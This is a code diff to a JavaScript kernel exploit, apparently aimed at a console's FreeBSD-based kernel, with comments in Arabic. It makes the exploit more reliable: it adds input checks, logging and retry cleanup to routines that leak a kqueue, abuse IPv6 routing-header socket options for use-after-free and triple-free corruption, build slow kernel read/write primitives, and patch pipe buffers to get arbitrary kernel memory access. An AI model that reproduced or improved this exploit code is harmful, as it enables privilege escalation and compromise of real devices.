@@ -152,7 +152,7 @@ var IOV_THREAD_NUM = 8;
 var UIO_THREAD_NUM = 8;
 var MAIN_LOOP_ITERATIONS = 3;
 var TRIPLEFREE_ITERATIONS = 8;
-var KQUEUE_ITERATIONS = 20000;
+var KQUEUE_ITERATIONS = 10000;
 var MAX_ROUNDS_TWIN = 5;
 var MAX_ROUNDS_TRIPLET = 200;
 var MAIN_CORE = 4;
@@ -260,10 +260,24 @@ function set_sockopt(sd, level, optname, optval, optlen) {
   return result;
 }
 function safe_set_sockopt(sd, level, optname, optval, optlen) {
+  if (!sd || sd.eq(BigInt_Error)) {
+    log('[SOCKOPT] invalid socket');
+    return BigInt_Error;
+  }
+
+  // السماح بمسح الـ rthdr بـ optlen = 0
+  if (level === IPPROTO_IPV6 && optname === IPV6_RTHDR && optlen === 0) {
+    // optval ممكن يكون 0 هنا
+  } else {
+    if (!optval || optlen <= 0) {
+      log('[SOCKOPT] invalid optval/optlen');
+      return BigInt_Error;
+    }
+  }
+
   var result = setsockopt(sd, level, optname, optval, optlen);
   if (result.eq(BigInt_Error)) {
-    log('[SOCKOPT] safe_set_sockopt failed: ' + hex(result));
-    return BigInt_Error;
+    log('[SOCKOPT] failed: ' + hex(result));
   }
   return result;
 }
@@ -1328,16 +1342,6 @@ function leak_kqueue() {
   * ===========================
   */
 function build_uio(uio, uio_iov, uio_td, read, addr, size) {
-  // struct uio {
-  //   0x00: uio_iov (ptr)
-  //   0x08: uio_iovcnt (int/size_t)
-  //   0x10: uio_offset (off_t)
-  //   0x18: uio_resid (ssize_t)
-  //   0x20: uio_segflg (int)
-  //   0x24: uio_rw (int)
-  //   0x28: uio_td (ptr)
-  // }
-
   write64(uio.add(0x00), uio_iov);              // uio_iov
   write64(uio.add(0x08), UIO_IOV_NUM);          // uio_iovcnt
   write64(uio.add(0x10), new BigInt(0));        // uio_offset
@@ -1346,7 +1350,7 @@ function build_uio(uio, uio_iov, uio_td, read, addr, size) {
   write32(uio.add(0x24), read ? UIO_READ : UIO_WRITE); // uio_rw
   write64(uio.add(0x28), uio_td);               // uio_td
 
-  // iovec واحد
+  // أول iovec
   write64(uio_iov.add(0x00), addr);             // iov_base
   write64(uio_iov.add(0x08), size);             // iov_len
 }
@@ -1365,7 +1369,20 @@ function kreadslow(addr, size) {
   for (var i = 0; i < UIO_THREAD_NUM; i++) {
     leak_buffers[i] = malloc(size);
   }
+  if (!addr || size <= 0) {
+    log('[KR] Invalid addr/size');
+    return BigInt_Error;
+  }
 
+  if (debugging.info.memory.available === 0) {
+    log('[KR] Memory exhausted before start');
+    return BigInt_Error;
+  }
+
+  if (!uio_sock_0 || !uio_sock_1) {
+    log('[KR] Invalid uio sockets');
+    return BigInt_Error;
+  }
   // ضبط SO_SNDBUF وتهيئة الـ socket
   write32(sockopt_val_buf, size);
   safe_set_sockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4);
@@ -1521,7 +1538,20 @@ function kwriteslow(addr, buffer, size) {
   var uio_leak_add = leak_rthdr.add(0x08);
   var count = 0;
   var zeroMemoryCount = 0;
+  if (!addr || size <= 0) {
+    log('[KW] Invalid addr/size');
+    return BigInt_Error;
+  }
 
+  if (debugging.info.memory.available === 0) {
+    log('[KW] Memory exhausted before start');
+    return BigInt_Error;
+  }
+
+  if (!uio_sock_0 || !uio_sock_1) {
+    log('[KW] Invalid uio sockets');
+    return BigInt_Error;
+  }
   while (true) {
     if (count % 500 === 0) {
       log('[KW] Stage1 progress=' + count);
@@ -1621,42 +1651,96 @@ function kwriteslow(addr, buffer, size) {
   */
 function setup_arbitrary_rw() {
   log('[RW] setup_arbitrary_rw: start');
+
+  // تحقق من kq_fdp
+  if (!kq_fdp || kq_fdp.eq(0) || kq_fdp.eq(BigInt_Error)) {
+    log('[RW] Invalid kq_fdp');
+    return false;
+  }
+
+  // fd_files = kq_fdp->fd_files (أو ما يكافئها في الأوفست اللي عندك)
   var fd_files = kreadslow64(kq_fdp);
-  if (fd_files.eq(BigInt_Error)) return false;
+  if (fd_files.eq(BigInt_Error) || fd_files.eq(0)) {
+    log('[RW] Failed to read fd_files from kq_fdp');
+    return false;
+  }
   fdt_ofiles = fd_files;
+
+  // master_r_pipe_file = fdt_ofiles[master_pipe[0]]
   master_r_pipe_file = kreadslow64(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE));
-  if (master_r_pipe_file.eq(BigInt_Error)) return false;
+  if (master_r_pipe_file.eq(BigInt_Error) || master_r_pipe_file.eq(0)) {
+    log('[RW] Invalid master_r_pipe_file');
+    return false;
+  }
+
+  // victim_r_pipe_file = fdt_ofiles[victim_pipe[0]]
   victim_r_pipe_file = kreadslow64(fdt_ofiles.add(victim_pipe[0] * FILEDESCENT_SIZE));
-  if (victim_r_pipe_file.eq(BigInt_Error)) return false;
+  if (victim_r_pipe_file.eq(BigInt_Error) || victim_r_pipe_file.eq(0)) {
+    log('[RW] Invalid victim_r_pipe_file');
+    return false;
+  }
+
+  // master_r_pipe_data = *(master_r_pipe_file)
   master_r_pipe_data = kreadslow64(master_r_pipe_file);
-  if (master_r_pipe_data.eq(BigInt_Error)) return false;
+  if (master_r_pipe_data.eq(BigInt_Error) || master_r_pipe_data.eq(0)) {
+    log('[RW] Invalid master_r_pipe_data');
+    return false;
+  }
+
+  // victim_r_pipe_data = *(victim_r_pipe_file)
   victim_r_pipe_data = kreadslow64(victim_r_pipe_file);
-  if (victim_r_pipe_data.eq(BigInt_Error)) return false;
+  if (victim_r_pipe_data.eq(BigInt_Error) || victim_r_pipe_data.eq(0)) {
+    log('[RW] Invalid victim_r_pipe_data');
+    return false;
+  }
+
+  // تجهيز struct pipebuf في master_pipe_buf
   write32(master_pipe_buf.add(0x00), 0);
   write32(master_pipe_buf.add(0x04), 0);
   write32(master_pipe_buf.add(0x08), 0);
   write32(master_pipe_buf.add(0x0C), PAGE_SIZE);
   write64(master_pipe_buf.add(0x10), victim_r_pipe_data);
+
+  // حقن pipebuf في master_r_pipe_data
   var ret = kwriteslow(master_r_pipe_data, master_pipe_buf, PIPEBUF_SIZE);
-  if (ret.eq(BigInt_Error)) return false;
+  if (ret.eq(BigInt_Error)) {
+    log('[RW] kwriteslow failed while writing pipebuf');
+    return false;
+  }
+
+  // تأكيد إن الـ pipebuf اتحدث فعلاً
   var ok = false;
   for (var i = 0; i < 3; i++) {
-    if (kread64(master_r_pipe_data.add(0x10)).eq(victim_r_pipe_data)) {
+    var cur = kread64(master_r_pipe_data.add(0x10));
+    if (cur.eq(victim_r_pipe_data)) {
       ok = true;
       break;
     }
     ret = kwriteslow(master_r_pipe_data, master_pipe_buf, PIPEBUF_SIZE);
-    if (ret.eq(BigInt_Error)) return false;
+    if (ret.eq(BigInt_Error)) {
+      log('[RW] kwriteslow retry failed while verifying pipebuf');
+      return false;
+    }
   }
-  if (!ok) return false;
+  if (!ok) {
+    log('[RW] Failed to verify patched pipebuf');
+    return false;
+  }
+
+  // fhold للـ pipes عشان نثبت الـ refs
   fhold(fget(master_pipe[0]));
   fhold(fget(master_pipe[1]));
   fhold(fget(victim_pipe[0]));
   fhold(fget(victim_pipe[1]));
+
+  // تنظيف rthdr من السوكيتات المستخدمة في التوين/تريبل
   remove_rthr_from_socket(ipv6_socks[triplets[0]]);
   remove_rthr_from_socket(ipv6_socks[triplets[1]]);
   remove_rthr_from_socket(ipv6_socks[triplets[2]]);
+
+  // إزالة ملف الـ UAF
   remove_uaf_file();
+
   log('[RW] setup_arbitrary_rw: success');
   return true;
 }
@@ -1799,14 +1883,12 @@ function retry(label, attempts, fn) {
   for (var i = 0; i < attempts; i++) {
     var ok = fn();
     if (ok) {
-      if (i > 0) {
-        log(label + ': succeeded after retry #' + i);
-      }
+      if (i > 0) log(label + ' succeeded after retry #' + i);
       return true;
     }
-    log(label + ': attempt ' + (i + 1) + ' failed');
+    log(label + ' attempt ' + (i + 1) + ' failed');
+    cleanup(true); // cleanup workers + sockets
   }
-  log(label + ': all attempts failed');
   return false;
 }
 
